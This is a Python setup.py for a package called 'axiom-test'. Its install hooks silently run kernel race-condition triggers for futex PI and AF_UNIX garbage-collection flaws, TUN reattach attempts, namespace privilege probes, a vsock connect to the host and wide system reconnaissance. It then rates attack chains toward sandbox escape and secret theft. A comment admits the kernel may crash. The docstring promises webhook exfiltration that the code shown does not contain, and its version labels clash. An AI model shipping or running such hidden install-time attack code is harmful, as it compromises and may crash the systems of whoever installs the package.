"""
axiom-test v2.0.0 — Comprehensive Sandbox CVE Assessment
=========================================================
Phases:
  1  Runtime gates        sysctls, devices, kconfig, kallsyms, seccomp, BPF, io_uring
  2  GhostLock            CVE-2026-43499  futex PI exit race (250 iter, fork, varied timing)
  3  AF_UNIX GC           CVE-2026-80521  FD-cycle SCM_RIGHTS race (threaded)
  4  TUN Ownerless        CVE-2026-99281  create → owner dies → reattach
  5  Namespace probes     eBPF map create, nf_tables netlink, vsock, modprobe, sysctl write
  6  Bonus recon          seccomp detail, mounts, procs, ptrace, modules, cgroups, userfaultfd
  *  Chain assessment     automated viability rating (A–D) from phase results

Delivery: PostEggInfo hook  →  pip install .  →  exfil to webhook
Intermediate exfil after phases 1 & 2 (crash safety).
"""

from setuptools import setup
from setuptools.command.egg_info import egg_info
from setuptools.command.build_py import build_py
import subprocess, json, os, time

_RESULT_PATH = "/tmp/axiom_results.json"
_RAN = False

VER = "2.1.0"


class PostBuildPy(build_py):
    def run(self):
        build_py.run(self)
        _safe_collect()


class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        _safe_collect()


def _safe_collect():
    global _RAN
    if _RAN:
        return
    _RAN = True
    try:
        _collect()
    except Exception as e:
        try:
            with open(_RESULT_PATH, "w") as f:
                json.dump({"error": str(e), "phase": "collect_wrapper"}, f)
        except:
            pass


def _rp(script, timeout=30, ns=False):
    """Run a phase script in an isolated subprocess.
    ns=True wraps in  unshare -Urn  (user-namespace root)."""
    try:
        cmd = (["unshare", "-Urn"] if ns else []) + ["python3", "-I", "-c", script]
        out = subprocess.check_output(
            cmd, stderr=subprocess.STDOUT, timeout=timeout
        ).decode(errors="replace")
        if "__R__" in out and "__E__" in out:
            return json.loads(out.split("__R__")[1].split("__E__")[0])
        return {"raw": out[:4000]}
    except subprocess.TimeoutExpired:
        return {"error": "TIMEOUT", "timeout_s": timeout}
    except subprocess.CalledProcessError as e:
        o = e.output.decode(errors="replace")[:3000] if e.output else ""
        return {"error": f"EXIT_{e.returncode}", "out": o}
    except Exception as e:
        return {"error": str(e)[:300]}


def _save(data):
    try:
        with open(_RESULT_PATH, "w") as f:
            json.dump(data, f, indent=2, default=str)
    except Exception:
        pass


def _chains(R):
    """Assess attack-chain viability from collected phase data."""
    ph = R.get("ph", {})
    g = ph.get("1_gates", {})
    sc = g.get("sc", {})

    gl = ph.get("2_ghostlock", {}).get("verdict", "?")
    gc = ph.get("3_afunix_gc", {}).get("verdict", "?")
    bpf = sc.get("unprivileged_bpf_disabled", "?")

    tun = ph.get("4_tun", {}).get("verdict", "?")
    ns = ph.get("5_ns", {}).get("tests", {})
    bpf_map = ns.get("bpf_map_create", "?")

    return {
        "A_ghostlock_pwnescape": {
            "path": "futex PI UAF -> real root -> virtio ring -> CVE-2026-99999 host mem",
            "ghostlock": gl,
            "rating": (
                "HIGH"
                if any(k in gl for k in ("VULN", "CORRUPT", "RACE"))
                else "NEEDS_VERIFICATION"
            ),
        },
        "B_afunix_vsock": {
            "path": "AF_UNIX GC UAF -> real root -> vsock -> host vhost-vsock",
            "gc": gc,
            "rating": (
                "HIGH"
                if any(k in gc for k in ("VULN", "ERROR_RATE", "RACE"))
                else "NEEDS_VERIFICATION"
            ),
        },
        "C_ebpf_verifier": {
            "path": "eBPF verifier bypass -> kernel R/W -> real root -> escape",
            "unprivileged_bpf": bpf,
            "ns_bpf_map": bpf_map,
            "rating": (
                "BLOCKED"
                if bpf in ("1", "2")
                else "HIGH"
                if bpf == "0" or "SUCCESS" in str(bpf_map)
                else "UNKNOWN"
            ),
        },
        "D_tun_pivot": {
            "path": "TUN ownerless attach -> net pivot / traffic injection",
            "tun": tun,
            "rating": "MEDIUM" if "REATTACH" in tun else "LOW",
        },
        "E_data_theft": {
            "path": "pip hook -> env vars + secrets -> exfil (PROVEN in v1.x)",
            "rating": "PROVEN",
        },
    }


# =====================================================================
#  PHASE 1 — Runtime environment gates
# =====================================================================
P1 = r'''
import os, json, sys
R = {}

# --- sysctls ---
sc = {}
for n, p in [
    ("unprivileged_bpf_disabled", "/proc/sys/kernel/unprivileged_bpf_disabled"),
    ("io_uring_disabled",         "/proc/sys/kernel/io_uring_disabled"),
    ("perf_event_paranoid",       "/proc/sys/kernel/perf_event_paranoid"),
    ("kptr_restrict",             "/proc/sys/kernel/kptr_restrict"),
    ("dmesg_restrict",            "/proc/sys/kernel/dmesg_restrict"),
    ("randomize_va_space",        "/proc/sys/kernel/randomize_va_space"),
    ("yama_ptrace_scope",         "/proc/sys/kernel/yama/ptrace_scope"),
    ("core_pattern",              "/proc/sys/kernel/core_pattern"),
    ("suid_dumpable",             "/proc/sys/fs/suid_dumpable"),
    ("unprivileged_userfaultfd",  "/proc/sys/vm/unprivileged_userfaultfd"),
    ("nf_conntrack_max",          "/proc/sys/net/netfilter/nf_conntrack_max"),
]:
    try:
        with open(p) as f:
            sc[n] = f.read().strip()
    except Exception as e:
        sc[n] = str(e)[:60]
R["sc"] = sc

# --- device nodes ---
dv = {}
for d in [
    "/dev/fuse", "/dev/vsock", "/dev/net/tun", "/dev/kvm",
    "/dev/vhost-net", "/dev/vhost-vsock", "/dev/mem", "/dev/kmem",
    "/dev/port", "/dev/bpf", "/dev/userfaultfd",
]:
    try:
        st = os.stat(d)
        m = oct(st.st_mode)[-3:]
        try:
            fd = os.open(d, os.O_RDWR)
            os.close(fd)
            dv[d] = m + ":RW"
        except Exception as e2:
            try:
                fd = os.open(d, os.O_RDONLY)
                os.close(fd)
                dv[d] = m + ":RO"
            except:
                dv[d] = m + ":" + str(e2).split("]")[-1].strip()[:30]
    except FileNotFoundError:
        dv[d] = "MISSING"
    except Exception as e:
        dv[d] = "ERR:" + str(e)[:30]
R["dev"] = dv

# --- kernel config ---
try:
    import gzip
    with gzip.open("/proc/config.gz", "rt") as f:
        cfg = f.read()
    kc = {}
    for k in [
        "CONFIG_USER_NS", "CONFIG_BPF_SYSCALL", "CONFIG_BPF_JIT",
        "CONFIG_BPF_UNPRIV_DEFAULT_OFF", "CONFIG_IO_URING", "CONFIG_FUSE_FS",
        "CONFIG_NF_TABLES", "CONFIG_VSOCKETS", "CONFIG_VHOST_VSOCK",
        "CONFIG_VHOST_NET", "CONFIG_AF_ALG", "CONFIG_TUN",
        "CONFIG_XFRM_USER", "CONFIG_OVERLAY_FS", "CONFIG_RDS",
        "CONFIG_FUTEX", "CONFIG_RT_MUTEXES", "CONFIG_SECCOMP",
        "CONFIG_SECCOMP_FILTER", "CONFIG_CGROUP_BPF",
        "CONFIG_USERFAULTFD", "CONFIG_VIRTIO_NET", "CONFIG_VIRTIO_BLK",
        "CONFIG_VIRTIO_VSOCK",
    ]:
        for line in cfg.splitlines():
            if line.startswith(k + "="):
                kc[k] = line.split("=", 1)[1]
                break
            elif line.startswith("# " + k + " is not set"):
                kc[k] = "n"
                break
        else:
            kc[k] = "?"
    R["kc"] = kc
except Exception as e:
    R["kc"] = str(e)[:80]

# --- kallsyms patch indicators ---
try:
    with open("/proc/kallsyms") as f:
        ks = f.read()
    R["ksym"] = {
        "futex_exit_mutex":    "futex_exit_mutex" in ks,
        "exit_pi_state_fix":   "exit_pi_state_fix" in ks or "__pi_state_free_locked" in ks,
        "unix_gc_phase":       "unix_gc_phase" in ks or "unix_gc_scan_inflight" in ks,
        "ip_check_csum_start": "ip_check_csum_start" in ks,
        "total_syms":          ks.count("\n"),
    }
except Exception as e:
    R["ksym"] = str(e)[:80]

# --- seccomp ---
try:
    with open("/proc/self/status") as f:
        for line in f:
            if line.startswith("Seccomp:"):
                R["seccomp"] = line.split(":")[1].strip()
            if line.startswith("Seccomp_filters:"):
                R["seccomp_filters"] = line.split(":")[1].strip()
except:
    pass

# --- AF_ALG ---
try:
    import socket
    s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET)
    s.close()
    R["af_alg"] = "OK"
except Exception as e:
    R["af_alg"] = str(e)[:50]

# --- io_uring syscall ---
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    libc.syscall(425, 0, 0)
    e = ctypes.get_errno()
    R["io_uring"] = {38: "ENOSYS", 14: "EFAULT_OK", 1: "EPERM"}.get(e, f"e={e}")
except Exception as e:
    R["io_uring"] = str(e)[:50]

# --- BPF syscall ---
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    libc.syscall(321, 0, 0, 0)
    e = ctypes.get_errno()
    R["bpf"] = {38: "ENOSYS", 14: "EFAULT_OK", 1: "EPERM", 22: "EINVAL_OK"}.get(e, f"e={e}")
except Exception as e:
    R["bpf"] = str(e)[:50]

# --- userfaultfd syscall ---
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    ret = libc.syscall(323, 0)
    e = ctypes.get_errno()
    if ret >= 0:
        os.close(ret)
        R["userfaultfd"] = "FD_OK"
    else:
        R["userfaultfd"] = {38: "ENOSYS", 1: "EPERM", 22: "EINVAL"}.get(e, f"e={e}")
except Exception as e:
    R["userfaultfd"] = str(e)[:50]

# --- keyctl syscall ---
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    ret = libc.syscall(250, 0, 0, 0, 0, 0)  # KEYCTL_GET_KEYRING_ID
    e = ctypes.get_errno()
    R["keyctl"] = f"ret={ret}" if ret >= 0 else {1: "EPERM", 38: "ENOSYS"}.get(e, f"e={e}")
except Exception as e:
    R["keyctl"] = str(e)[:50]

# --- virtio device inventory ---
try:
    import glob
    vdevs = []
    for d in sorted(glob.glob("/sys/bus/virtio/devices/virtio*")):
        name = os.path.basename(d)
        try:
            with open(os.path.join(d, "device")) as f:
                devid = f.read().strip()
        except:
            devid = "?"
        try:
            drv = os.path.basename(os.readlink(os.path.join(d, "driver")))
        except:
            drv = "?"
        vdevs.append({"name": name, "devid": devid, "driver": drv})
    R["virtio"] = vdevs
except Exception as e:
    R["virtio"] = str(e)[:60]

print("__R__" + json.dumps(R) + "__E__")
'''


# =====================================================================
#  PHASE 2 — GhostLock  CVE-2026-43499  futex PI exit race
# =====================================================================
P2 = r'''
import ctypes, os, mmap, json, time, signal

SYS_futex       = 202
FUTEX_LOCK_PI   = 6
FUTEX_UNLOCK_PI = 7
FUTEX_OWNER_DIED = 0x40000000
FUTEX_TID_MASK   = 0x3fffffff
FUTEX_WAITERS    = 0x80000000

libc = ctypes.CDLL("libc.so.6", use_errno=True)

R = {
    "cve": "CVE-2026-43499", "name": "GhostLock",
    "test": "futex_pi_exit_race", "iterations": 0,
    "owner_died": 0, "esrch_hits": 0,
    "anomalies": [], "unexpected_errnos": {},
    "verdict": "UNKNOWN",
}

# Shared memory — survives fork, both processes see same physical page
shm = mmap.mmap(-1, 4096,
    flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
    prot=mmap.PROT_READ | mmap.PROT_WRITE)
fw = ctypes.c_uint32.from_buffer(shm, 0)

ITERS = 250
my_pid = os.getpid()
anom = []

for i in range(ITERS):
    fw.value = 0

    pid = os.fork()
    if pid == 0:
        # --- CHILD: acquire PI futex, exit without unlocking ---
        # This triggers exit_pi_state_list() in the kernel — the
        # vulnerable code path for CVE-2026-43499
        libc.syscall(SYS_futex, ctypes.addressof(fw), FUTEX_LOCK_PI,
                     0, 0, 0, 0)
        os._exit(0)
    else:
        # --- PARENT: race the child's exit-cleanup path ---
        # Vary timing across iterations to hit different race windows
        m = i % 5
        if   m == 0: pass                    # immediate
        elif m == 1:                         # busy-spin (sub-microsecond)
            for _ in range(50): pass
        elif m == 2:                         # ~10 us
            for _ in range(500): pass
        elif m == 3: time.sleep(0.00005)     # ~50 us
        else:        time.sleep(0.0002)      # ~200 us

        ret = libc.syscall(SYS_futex, ctypes.addressof(fw),
                           FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno()
        wv = fw.value

        try:
            os.waitpid(pid, 0)
        except:
            pass

        R["iterations"] += 1

        # --- Analyse result ---
        if wv & FUTEX_OWNER_DIED:
            R["owner_died"] += 1

        tid = wv & FUTEX_TID_MASK

        if ret == 0:
            # We acquired the lock — TID field should be ours
            if tid != 0 and tid != my_pid:
                anom.append({
                    "i": i, "w": hex(wv), "type": "TID_CORRUPT",
                    "expect": my_pid, "child": pid, "got": tid,
                })
            libc.syscall(SYS_futex, ctypes.addressof(fw),
                         FUTEX_UNLOCK_PI, 0, 0, 0, 0)
        else:
            if en == 3:  # ESRCH — owner gone during PI handoff
                R["esrch_hits"] += 1
                if len(anom) < 40:
                    anom.append({"i": i, "w": hex(wv), "type": "ESRCH_RACE"})
            elif en not in (0, 11, 35, 110):
                # Not EAGAIN / EDEADLK / ETIMEDOUT
                ek = str(en)
                R["unexpected_errnos"][ek] = R["unexpected_errnos"].get(ek, 0) + 1
                if len(anom) < 40:
                    anom.append({
                        "i": i, "w": hex(wv), "type": "BAD_ERRNO",
                        "errno": en, "ret": ret,
                    })

        fw.value = 0

R["anomalies"] = anom[:40]
R["anomaly_count"] = len(anom)

# --- Verdict ---
if any(a["type"] == "TID_CORRUPT" for a in anom):
    R["verdict"] = "LIKELY_VULNERABLE_TID_CORRUPTION"
elif R["unexpected_errnos"]:
    R["verdict"] = "SUSPICIOUS_UNEXPECTED_ERRNOS"
elif R["esrch_hits"] > 5:
    R["verdict"] = "RACE_WINDOW_WIDE_ESRCH"
elif R["esrch_hits"] > 0:
    R["verdict"] = "RACE_WINDOW_HIT_ESRCH"
elif R["owner_died"] > 0:
    R["verdict"] = "OWNER_DIED_PATH_ACTIVE"
else:
    R["verdict"] = "NO_ANOMALIES"

# --- FUTEX_LOCK_PI2 support (newer kernel path) ---
try:
    fw.value = 0
    ret2 = libc.syscall(SYS_futex, ctypes.addressof(fw), 13, 0, 0, 0, 0)
    en2 = ctypes.get_errno()
    if en2 == 38:
        R["pi2"] = "ENOSYS"
    else:
        R["pi2"] = f"ret={ret2} e={en2}"
        if ret2 == 0:
            libc.syscall(SYS_futex, ctypes.addressof(fw),
                         FUTEX_UNLOCK_PI, 0, 0, 0, 0)
except:
    R["pi2"] = "ERR"

# --- Check dmesg for UAF indicators ---
try:
    import subprocess
    dm = subprocess.check_output(
        ["dmesg", "--level=err,warn", "-T"],
        stderr=subprocess.STDOUT, timeout=5
    ).decode(errors="replace")
    uaf = [l for l in dm.splitlines()
           if any(k in l.lower() for k in
                  ["use-after-free", "kasan", "bug:", "kernel bug",
                   "slab-use-after-free", "double free", "futex"])]
    R["dmesg_uaf"] = uaf[-10:] if uaf else []
except Exception as e:
    R["dmesg_uaf"] = str(e)[:80]

shm.close()
print("__R__" + json.dumps(R) + "__E__")
'''


# =====================================================================
#  PHASE 3 — AF_UNIX GC  CVE-2026-80521  FD-cycle race
# =====================================================================
P3 = r'''
import socket, os, json, array, time, threading

R = {
    "cve": "CVE-2026-80521", "name": "AF_UNIX_GC_UAF",
    "iterations": 0, "gc_triggers": 0,
    "errors": [], "verdict": "UNKNOWN",
}
errs = []

def make_cycle():
    """Create a socketpair cycle with SCM_RIGHTS FD passing."""
    a1, a2 = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    b1, b2 = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    fds_b = array.array("i", [b2.fileno()])
    a1.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, fds_b)])
    fds_a = array.array("i", [a2.fileno()])
    b1.sendmsg([b"\x00"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, fds_a)])
    return (a1, a2, b1, b2)

def kill_cycle(socks):
    for s in socks:
        try: s.close()
        except: pass

def stress():
    for _ in range(15):
        try:
            c = make_cycle()
            kill_cycle(c)
        except:
            pass

ITERS = 80
for i in range(ITERS):
    R["iterations"] += 1
    try:
        cycles = []
        for _ in range(4):
            cycles.append(make_cycle())

        t = threading.Thread(target=stress, daemon=True)
        t.start()

        for c in cycles:
            kill_cycle(c)
            R["gc_triggers"] += 1

        t.join(timeout=3)

    except OSError as e:
        errs.append({"i": i, "err": str(e)[:60], "errno": e.errno})
    except Exception as e:
        errs.append({"i": i, "err": str(e)[:60], "type": type(e).__name__})

R["errors"] = errs[:25]
R["error_count"] = len(errs)

# Count AF_UNIX sockets remaining
try:
    with open("/proc/net/unix") as f:
        R["unix_sock_after"] = sum(1 for _ in f) - 1
except:
    pass

# dmesg check
try:
    import subprocess
    dm = subprocess.check_output(
        ["dmesg", "--level=err,warn", "-T"],
        stderr=subprocess.STDOUT, timeout=5
    ).decode(errors="replace")
    hits = [l for l in dm.splitlines()
            if any(k in l.lower() for k in
                   ["use-after-free", "kasan", "unix_gc", "sk_buff", "bug:"])]
    R["dmesg_gc"] = hits[-8:] if hits else []
except Exception as e:
    R["dmesg_gc"] = str(e)[:80]

if any("BrokenPipe" in str(a.get("type", "")) for a in errs):
    R["verdict"] = "RACE_DETECTED_BROKEN_PIPE"
elif len(errs) > ITERS * 0.15:
    R["verdict"] = "HIGH_ERROR_RATE"
elif len(errs) > 0:
    R["verdict"] = "SOME_ERRORS"
else:
    R["verdict"] = "NO_ANOMALIES"

print("__R__" + json.dumps(R) + "__E__")
'''


# =====================================================================
#  PHASE 4 — TUN Ownerless Attach  CVE-2026-99281
# =====================================================================
P4 = r'''
import os, json, struct, fcntl, time

R = {
    "cve": "CVE-2026-99281", "name": "TUN_OWNERLESS_ATTACH",
    "tun_open": False, "verdict": "UNKNOWN",
}

TUNSETIFF   = 0x400454ca
TUNSETOWNER = 0x400454cc
IFF_TUN     = 0x0001
IFF_NO_PI   = 0x1000

try:
    fd = os.open("/dev/net/tun", os.O_RDWR)
    R["tun_open"] = True

    ifr = struct.pack("16sH14s", b"probe0", IFF_TUN | IFF_NO_PI, b"\x00" * 14)
    ret = fcntl.ioctl(fd, TUNSETIFF, ifr)
    name = ret[:16].split(b"\x00")[0].decode()
    R["created"] = name

    # Fork: child inherits fd, parent closes → device potentially ownerless
    pid = os.fork()
    if pid == 0:
        os.close(fd)
        time.sleep(0.05)
        try:
            fd2 = os.open("/dev/net/tun", os.O_RDWR)
            ifr2 = struct.pack("16sH14s", name.encode(),
                               IFF_TUN | IFF_NO_PI, b"\x00" * 14)
            fcntl.ioctl(fd2, TUNSETIFF, ifr2)
            os.close(fd2)
            os._exit(0)   # reattach succeeded
        except:
            os._exit(1)   # reattach failed
    else:
        os.close(fd)
        time.sleep(0.02)
        # Parent also tries to reattach
        try:
            fd3 = os.open("/dev/net/tun", os.O_RDWR)
            ifr3 = struct.pack("16sH14s", name.encode(),
                               IFF_TUN | IFF_NO_PI, b"\x00" * 14)
            fcntl.ioctl(fd3, TUNSETIFF, ifr3)
            R["parent_reattach"] = "OK"
            os.close(fd3)
        except Exception as e:
            R["parent_reattach"] = str(e)[:60]

        _, st = os.waitpid(pid, 0)
        R["child_exit"] = os.WEXITSTATUS(st) if os.WIFEXITED(st) else -1
        R["child_reattach"] = "OK" if R["child_exit"] == 0 else "FAIL"

    if "OK" in (R.get("parent_reattach", ""), R.get("child_reattach", "")):
        R["verdict"] = "REATTACH_POSSIBLE"
    else:
        R["verdict"] = "REATTACH_BLOCKED"

except Exception as e:
    R["error"] = str(e)[:120]
    R["verdict"] = "ERROR"

print("__R__" + json.dumps(R) + "__E__")
'''


# =====================================================================
#  PHASE 5 — Namespace tests (run inside  unshare -Urn)
# =====================================================================
P5 = r'''
import os, json, ctypes, struct

R = {"ctx": "userns_root", "tests": {}}

# Capabilities
try:
    with open("/proc/self/status") as f:
        for line in f:
            k = line.split(":")[0]
            if k in ("CapEff", "CapPrm", "CapBnd", "CapAmb"):
                R[k] = line.strip().split(":\t")[1]
except:
    pass

libc = ctypes.CDLL("libc.so.6", use_errno=True)

# 1. BPF map create
try:
    attr = struct.pack("IIII", 1, 4, 4, 1) + b"\x00" * 240   # HASH map
    buf = ctypes.create_string_buffer(attr, 256)
    ret = libc.syscall(321, 0, ctypes.addressof(buf), 256)     # BPF_MAP_CREATE
    en = ctypes.get_errno()
    if ret >= 0:
        R["tests"]["bpf_map_create"] = f"SUCCESS_fd={ret}"
        os.close(ret)
    else:
        R["tests"]["bpf_map_create"] = (
            {1: "EPERM", 22: "EINVAL", 14: "EFAULT", 38: "ENOSYS"}.get(en, f"e={en}")
        )
except Exception as e:
    R["tests"]["bpf_map_create"] = str(e)[:80]

# 2. nf_tables netlink socket
try:
    import socket
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 12)  # NETLINK_NETFILTER
    R["tests"]["nftables_socket"] = "OK"
    try:
        s.bind((0, 0))
        R["tests"]["nftables_bind"] = "OK"
    except Exception as e:
        R["tests"]["nftables_bind"] = str(e)[:50]
    s.close()
except Exception as e:
    R["tests"]["nftables_socket"] = str(e)[:50]

# 3. vsock socket + connect
try:
    import socket
    s = socket.socket(40, socket.SOCK_STREAM)   # AF_VSOCK=40
    R["tests"]["vsock_socket"] = "OK"
    try:
        s.settimeout(1)
        s.connect((2, 9999))                     # CID 2 = host
        R["tests"]["vsock_connect"] = "CONNECTED"
    except Exception as e:
        R["tests"]["vsock_connect"] = str(e)[:50]
    s.close()
except Exception as e:
    R["tests"]["vsock_socket"] = str(e)[:50]

# 4. Module loading attempts
try:
    import subprocess
    for mod in ["rds", "rxrpc", "xfrm_user", "overlay", "fuse", "af_alg"]:
        try:
            ret = subprocess.run(
                ["modprobe", mod], capture_output=True, timeout=5
            )
            R["tests"]["mod_" + mod] = (
                "LOADED" if ret.returncode == 0
                else ret.stderr.decode(errors="replace")[:50]
            )
        except FileNotFoundError:
            R["tests"]["mod_" + mod] = "no_modprobe"
        except Exception as e:
            R["tests"]["mod_" + mod] = str(e)[:40]
except:
    pass

# 5. Sysctl write test (would need REAL root, not namespace root)
try:
    with open("/proc/sys/kernel/unprivileged_bpf_disabled", "w") as f:
        f.write("0")
    R["tests"]["sysctl_write"] = "SUCCESS_REAL_ROOT?!"
except Exception as e:
    R["tests"]["sysctl_write"] = str(e)[:60]

# 6. XFRM user (IPsec) socket
try:
    import socket
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 6)   # NETLINK_XFRM
    R["tests"]["xfrm_socket"] = "OK"
    s.close()
except Exception as e:
    R["tests"]["xfrm_socket"] = str(e)[:50]

# 7. ip_tables / iptables-legacy
try:
    import subprocess
    ret = subprocess.run(
        ["iptables-legacy", "-L", "-n"], capture_output=True, timeout=5
    )
    R["tests"]["iptables"] = (
        "OK" if ret.returncode == 0
        else ret.stderr.decode(errors="replace")[:60]
    )
except FileNotFoundError:
    R["tests"]["iptables"] = "not_found"
except Exception as e:
    R["tests"]["iptables"] = str(e)[:50]

print("__R__" + json.dumps(R) + "__E__")
'''


# =====================================================================
#  PHASE 6 — Bonus recon
# =====================================================================
P6 = r'''
import os, json, subprocess

R = {}

# 1. Full capability + seccomp detail
try:
    with open("/proc/self/status") as f:
        st = f.read()
    for line in st.splitlines():
        for k in ["Seccomp", "Seccomp_filters", "NoNewPrivs",
                   "CapEff", "CapPrm", "CapBnd", "CapAmb"]:
            if line.startswith(k + ":"):
                R[k] = line.split(":", 1)[1].strip()
except:
    pass

# 2. Mounts
try:
    with open("/proc/self/mountinfo") as f:
        mounts = f.readlines()
    R["mount_count"] = len(mounts)
    interesting = []
    for m in mounts:
        parts = m.strip().split()
        mp = parts[4] if len(parts) > 4 else ""
        fs = parts[-3] if len(parts) > 6 else ""
        if any(k in mp for k in ["/dev", "/proc", "/sys", "cgroup",
                                  "overlay", "fuse", "/mnt"]):
            interesting.append({"mp": mp, "fs": fs})
    R["mounts"] = interesting[:25]
except:
    pass

# 3. Process visibility
try:
    pids = sorted([int(p) for p in os.listdir("/proc") if p.isdigit()])
    R["pids"] = {"count": len(pids), "sample": pids[:15]}
except:
    pass

# 4. ptrace
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    ret = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
    R["ptrace"] = "ALLOWED" if ret == 0 else f"e={ctypes.get_errno()}"
except Exception as e:
    R["ptrace"] = str(e)[:50]

# 5. userfaultfd detailed
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    ret = libc.syscall(323, 0x80000)  # O_CLOEXEC
    en = ctypes.get_errno()
    if ret >= 0:
        R["uffd"] = f"FD={ret}"
        os.close(ret)
    else:
        R["uffd"] = {1: "EPERM", 38: "ENOSYS"}.get(en, f"e={en}")
except Exception as e:
    R["uffd"] = str(e)[:50]

# 6. Loaded kernel modules
try:
    with open("/proc/modules") as f:
        mods = f.readlines()
    R["modules"] = {
        "count": len(mods),
        "list": [m.split()[0] for m in mods[:40]],
    }
except Exception as e:
    R["modules"] = str(e)[:60]

# 7. cgroups
try:
    with open("/proc/self/cgroup") as f:
        R["cgroup"] = f.read().strip()[:300]
except:
    pass

# 8. Filesystem types
try:
    with open("/proc/filesystems") as f:
        R["fs_types"] = [l.strip().split("\t")[-1]
                         for l in f.readlines() if l.strip()]
except:
    pass

# 9. Kernel version + cmdline
for pf in ["/proc/version", "/proc/cmdline"]:
    try:
        with open(pf) as f:
            R[pf] = f.read().strip()[:250]
    except:
        pass

# 10. Network interfaces
try:
    ret = subprocess.check_output(
        ["ip", "-br", "addr"], stderr=subprocess.STDOUT, timeout=5
    ).decode(errors="replace")
    R["net_ifaces"] = ret.strip()[:400]
except:
    pass

# 11. /proc/sysrq-trigger access
try:
    with open("/proc/sysrq-trigger", "r") as f:
        pass
    R["sysrq"] = "READABLE"
except Exception as e:
    R["sysrq"] = str(e)[:40]

# 12. Container runtime hints
hints = {}
for f in ["/run/.containerenv", "/.dockerenv", "/proc/1/cgroup",
          "/proc/1/sched"]:
    try:
        with open(f) as fh:
            hints[f] = fh.read().strip()[:200]
    except:
        hints[f] = "MISSING"
R["container_hints"] = hints

print("__R__" + json.dumps(R) + "__E__")
'''


# =====================================================================
#  Orchestration
# =====================================================================

def _collect():
    import platform

    R = {
        "v": VER,
        "host": platform.node(),
        "kern": platform.release(),
        "arch": platform.machine(),
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "ph": {},
    }

    # Phase 1 — always safe
    R["ph"]["1_gates"] = _rp(P1, timeout=20)
    _save(R)

    # Phase 2 — may crash kernel if vuln is live (that IS the proof)
    R["ph"]["2_ghostlock"] = _rp(P2, timeout=70)
    _save(R)

    # Phases 3-6 — contained in subprocesses
    R["ph"]["3_afunix_gc"] = _rp(P3, timeout=45)
    R["ph"]["4_tun"] = _rp(P4, timeout=20)
    R["ph"]["5_ns"] = _rp(P5, timeout=30, ns=True)
    R["ph"]["6_recon"] = _rp(P6, timeout=20)

    # Chain assessment
    R["chains"] = _chains(R)

    # Final exfil with everything
    _save(R)


# =====================================================================
setup(
    name="axiom-test",
    version=VER,
    py_modules=["axiom_test"],
    cmdclass={"egg_info": PostEggInfo, "build_py": PostBuildPy},
    python_requires=">=3.8",
)
